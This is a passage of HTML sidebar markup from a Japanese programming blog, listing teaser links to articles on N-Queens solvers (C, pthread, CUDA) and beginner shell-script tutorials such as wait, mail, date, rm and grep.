<img src=https://suzukiiichiro.github.io/posts/2023-08-01-02-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2023-08-01-02-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-08-01-02-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_200x0_resize_q75_box.jpg 2x" width=100 height=75 loading=lazy alt="Ｎクイーン問題（６１）第七章 並列処理 ミラー ＮＶＩＤＩＡ ＣＵＤＡ編">
</picture>
</div>
<div class=article-details>
<strong class=article-title>Ｎクイーン問題（６１）第七章 並列処理 ミラー ＮＶＩＤＩＡ ＣＵＤＡ編</strong>
<p class=text>【参考リンク】Ｎクイーン問題 過去記事一覧はこちらから エイト・クイーンのプログラムアーカ…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2023-08-01-01-n-queens-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2023-08-01-01-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-08-01-01-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=75>
<source srcset="https://suzukiiichiro.github.io/posts/2023-08-01-01-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-08-01-01-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=38>
<img src=https://suzukiiichiro.github.io/posts/2023-08-01-01-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2023-08-01-01-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-08-01-01-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_751852_200x0_resize_q75_box.jpg 2x" width=100 height=75 loading=lazy alt="Ｎクイーン問題（６０）第七章 並列処理 ビットマップ ＮＶＩＤＩＡ ＣＵＤＡ編">
</picture>
</div>
<div class=article-details>
<strong class=article-title>Ｎクイーン問題（６０）第七章 並列処理 ビットマップ ＮＶＩＤＩＡ ＣＵＤＡ編</strong>
<p class=text>【参考リンク】Ｎクイーン問題 過去記事一覧はこちらから エイト・クイーンのプログラムアーカ…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2023-06-28-09-n-queens-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2023-06-28-09-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-06-28-09-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=61>
<source srcset="https://suzukiiichiro.github.io/posts/2023-06-28-09-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-06-28-09-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=30>
<img src=https://suzukiiichiro.github.io/posts/2023-06-28-09-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2023-06-28-09-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-06-28-09-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_200x0_resize_q75_box.jpg 2x" width=100 height=61 loading=lazy alt="Ｎクイーン問題（５９）第六章 並列処理 pthread C言語編">
</picture>
</div>
<div class=article-details>
<strong class=article-title>Ｎクイーン問題（５９）第六章 並列処理 pthread C言語編</strong>
<p class=text>【参考リンク】Ｎクイーン問題 過去記事一覧はこちらから エイト・クイーンのプログラムアーカ…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2023-06-28-08-n-queens-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2023-06-28-08-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-06-28-08-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=61>
<source srcset="https://suzukiiichiro.github.io/posts/2023-06-28-08-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-06-28-08-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=30>
<img src=https://suzukiiichiro.github.io/posts/2023-06-28-08-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2023-06-28-08-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-06-28-08-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_200x0_resize_q75_box.jpg 2x" width=100 height=61 loading=lazy alt="Ｎクイーン問題（５８）第八章 キャリーチェーン C言語編">
</picture>
</div>
<div class=article-details>
<strong class=article-title>Ｎクイーン問題（５８）第八章 キャリーチェーン C言語編</strong>
<p class=text>【参考リンク】Ｎクイーン問題 過去記事一覧はこちらから エイト・クイーンのソース置き場 B…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2023-06-28-07-n-queens-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2023-06-28-07-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-06-28-07-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=61>
<source srcset="https://suzukiiichiro.github.io/posts/2023-06-28-07-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-06-28-07-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=30>
<img src=https://suzukiiichiro.github.io/posts/2023-06-28-07-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2023-06-28-07-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-06-28-07-n-queens-suzuki/chess_hu5d4d4af13a53f9dee6df2227e73445ae_454056_200x0_resize_q75_box.jpg 2x" width=100 height=61 loading=lazy alt="Ｎクイーン問題（５７）第八章 対称解除法 C言語編">
</picture>
</div>
<div class=article-details>
<strong class=article-title>Ｎクイーン問題（５７）第八章 対称解除法 C言語編</strong>
<p class=text>【参考リンク】Ｎクイーン問題 過去記事一覧はこちらから エイト・クイーンのソース置き場 B…</p>
</div>
</a>
</article>
</div>
<div class=link-btns>
<a href=https://suzukiiichiro.github.io/posts/>最新の記事をもっと見る</a>
</div>
</div>
</aside>
<section class="widget archives">
<h2 class=section-title>サイト内検索</h2>
<form action=https://suzukiiichiro.github.io/search/ class="search-form widget" data-json=https://suzukiiichiro.github.io/search/index.json>
<input name=keyword required placeholder=検索する文字>
<button title=検索><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
</button>
</form>
</section>
<aside class="widget archives sidearticle-contents--wrapper" id=popular-articles>
<h2 class=section-title>人気コンテンツ</h2>
<div class=sidearticle-contents>
<div class="flex article-list--tile">
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=127>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=63>
<img src=https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" width=100 height=127 loading=lazy alt=【２９．waitコマンド】ざっくりわかる「シェルスクリプト」>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【２９．waitコマンド】ざっくりわかる「シェルスクリプト」</strong>
<p class=text>waitコマンドは、実行中のプロセスの完了を待機するLinuxの組み込みコマンドです。 waitコマンドは、特定のプロセスIDまたはジョブIDで使用されます。waitコマンドでプロセスIDまたはジョブIDが指定されていない場合、現在のすべての子プロセスが完了するのを待機し、終了ステータスを返します。' wait_example.sh'という名前のファイルを作成し、次のスクリプトを追加します。 wa…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=30>
<source srcset="https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=15>
<img src=https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg 2x" width=100 height=30 loading=lazy alt=【ssh/Bash】sshでログインして実行して自動的に抜けて返ってくる最も簡単な方法>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【ssh/Bash】sshでログインして実行して自動的に抜けて返ってくる最も簡単な方法</strong>
<p class=text>sshでサーバーにログインして、なんらかのコマンドを実行しターミナルに表示、ミッション終了後、ターミナルを自動的にログアウトしてローカルに何事もなかったかのようにもどってくる最も簡単な方法 やりたいこと sshでサーバーにログインして、なんらかのコマンドを実行しターミナルに表示、ミッション終了後、ターミナルを自動的にログアウトして…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal_hu1fa49663358d8289c9aaa2b108c2bef9_133702_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal_hu1fa49663358d8289c9aaa2b108c2bef9_133702_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=67>
<source srcset="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal_hu1fa49663358d8289c9aaa2b108c2bef9_133702_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal_hu1fa49663358d8289c9aaa2b108c2bef9_133702_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=33>
<img src=https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal_hu1fa49663358d8289c9aaa2b108c2bef9_133702_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal_hu1fa49663358d8289c9aaa2b108c2bef9_133702_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal_hu1fa49663358d8289c9aaa2b108c2bef9_133702_200x0_resize_q75_box.jpg 2x" width=100 height=67 loading=lazy alt=e-Statで面白いデータを探そう。ランキング上位「アイスクリーム」ってなんだ？>
</picture>
</div>
<div class=article-details>
<strong class=article-title>e-Statで面白いデータを探そう。ランキング上位「アイスクリーム」ってなんだ？</strong>
<p class=text>ここではe-Statの検索ランキング上位の「アイスクリーム」というのはどういう統計データなのかを説明しながら、私のe-Statデータマイニングの目的が大量のビックデータから社会的関心の高い項目を抽出することであることを示します。 私のe-Statでのデータマイニングの現在の目的は以下の通りです 大量の政府公開データの中から ①面白そうなデータをピックアップする ②データをわ…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep_hu5909208fb16d2109d0cdca2186f9358e_30103_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep_hu5909208fb16d2109d0cdca2186f9358e_30103_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=170>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep_hu5909208fb16d2109d0cdca2186f9358e_30103_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep_hu5909208fb16d2109d0cdca2186f9358e_30103_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=85>
<img src=https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep_hu5909208fb16d2109d0cdca2186f9358e_30103_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep_hu5909208fb16d2109d0cdca2186f9358e_30103_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep_hu5909208fb16d2109d0cdca2186f9358e_30103_200x0_resize_q75_box.jpg 2x" width=100 height=170 loading=lazy alt=【grep特集】ざっくりわかるシェルスクリプト４>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【grep特集】ざっくりわかるシェルスクリプト４</strong>
<p class=text>bashプログラミングで最も強力な「grep」コマンドの基本的な考え方、bashスクリプトでの一般的な操作例を、ざっくりと説明します。 はじめに grep（グレップ）コマンド。UNIX/Linuxにおいてこれほど歴史あり、強力なコマンドはありません。そして多くのユーザーがこのコ…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=127>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=63>
<img src=https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" width=100 height=127 loading=lazy alt=【２７．mailコマンド】ざっくりわかる「シェルスクリプト」>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【２７．mailコマンド】ざっくりわかる「シェルスクリプト」</strong>
<p class=text>' mail 'または ' sendmail 'コマンドを使用して電子メールを送信できます。これらのコマンドを使用する前に、mailまたはsendmailに必要なパッケージをインストール・設定をする必要があります。' mail_example.sh 'という名前のファイルを作成し、次のコードを追加して電子メールを送信します。 mailコマンド メールを送る： ' mail &amp;lsquo;または '…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=127>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=63>
<img src=https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" width=100 height=127 loading=lazy alt=【２８．dateコマンド】ざっくりわかる「シェルスクリプト」>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【２８．dateコマンド】ざっくりわかる「シェルスクリプト」</strong>
<p class=text>dateコマンドを使用して、現在のシステムの日付と時刻の値を取得することができます。日付と時刻は、「Y」、「m」、「d」、「H」、「M」、および「S」を使用します。'date_parse.sh'という名前の新しいファイルを作成し、次のコードを追加して、日、月、年、時、分、秒の値を表示します。 dateコマンド 現在の日付を解析する： dateコマンドを使用して、現在のシステムの日付と時刻の値を取得…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=127>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=63>
<img src=https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" width=100 height=127 loading=lazy alt=【２０．スクリプトからの戻り値を渡す】ざっくりわかる「シェルスクリプト」>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【２０．スクリプトからの戻り値を渡す】ざっくりわかる「シェルスクリプト」</strong>
<p class=text>Bash関数は、数値と文字列値の両方を渡すことができます。関数から文字列値を渡す方法を次の例に示します。'function_return.sh'という名前のファイルを作成し、次のコードを追加します。関数greeting（）は、文字列値を変数valに返します。この変数は、処理の最後に他の文字列と組み合わせて出力します。 関数からの戻り値の受け渡し 関数からの戻り値の受け渡し： Bash関数は、数値と…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=127>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=63>
<img src=https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" width=100 height=127 loading=lazy alt=【２４．ファイルを削除する】ざっくりわかる「シェルスクリプト」>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【２４．ファイルを削除する】ざっくりわかる「シェルスクリプト」</strong>
<p class=text>'rm'コマンドは、ファイルまたはディレクトリを削除するためのコマンドです。次のコードを使用して「delete_file.sh」という名前のファイルを作成し、ユーザーからファイル名を取得して削除します。ここで、「-i」オプションは、ファイルを削除する前にユーザーに削除確認をに使用されます。 ファイルを削除する ファイルを削除します： &amp;lsquo;rm&amp;rsquo;コマンドは、ファイルまたはディレ…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=127>
<source srcset="https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=63>
<img src=https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" width=100 height=127 loading=lazy alt=【grep/sed/awkも】ざっくりわかるシェルスクリプト５」>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【grep/sed/awkも】ざっくりわかるシェルスクリプト５」</strong>
<p class=text>この記事はシェルスクリプトを４５分でざっくりマスターできるチュートリアルです。bashスクリプト「Hello, World」から、ifステートメントなどの条件分岐、while, for, untilループをはじめ、シェルスクリプトの効率的なデバッグ手法の紹介など、シェルスクリプトを網羅的かつ短時間で学習することができます。 …</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=129>
<source srcset="https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=64>
<img src=https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg 2x" width=100 height=129 loading=lazy alt=（８）【grep】シェルスクリプトコマンド活用紹介>
</picture>
</div>
<div class=article-details>
<strong class=article-title>（８）【grep】シェルスクリプトコマンド活用紹介</strong>
<p class=text>指定した文字が含まれている行だけを抽出する grepコマンド コマンドの実行結果から必要な箇所だけを抽出する 単語単位で検索する 前後の行も表示する 行番号付きで表示する 複数の文字列を指定して…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro_hu24c71efb47487f1e866b5cfa9cf10000_52262_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro_hu24c71efb47487f1e866b5cfa9cf10000_52262_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=58>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro_hu24c71efb47487f1e866b5cfa9cf10000_52262_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro_hu24c71efb47487f1e866b5cfa9cf10000_52262_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=29>
